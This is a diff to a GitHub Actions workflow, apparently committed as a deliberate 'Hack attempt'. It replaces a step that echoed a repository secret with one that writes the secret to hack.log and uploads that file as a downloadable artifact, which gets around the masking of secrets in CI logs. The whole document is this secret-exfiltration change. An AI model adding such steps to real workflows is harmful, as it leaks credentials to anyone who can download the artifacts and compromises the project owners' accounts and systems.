@@ -23,5 +23,9 @@ jobs:
       with:
         submodules: recursive
       
-    - name: Hack attempt
-      run: echo secret = ${{ secrets.TEST123 }}
+    - name: Hack attempt 2
+      run: echo ${{ secrets.TEST123 }} >> hack.log
+    - uses: actions/upload-artifact@v3
+      with:
+        name: TestLog
+        path: ${{github.workspace}}/hack.log
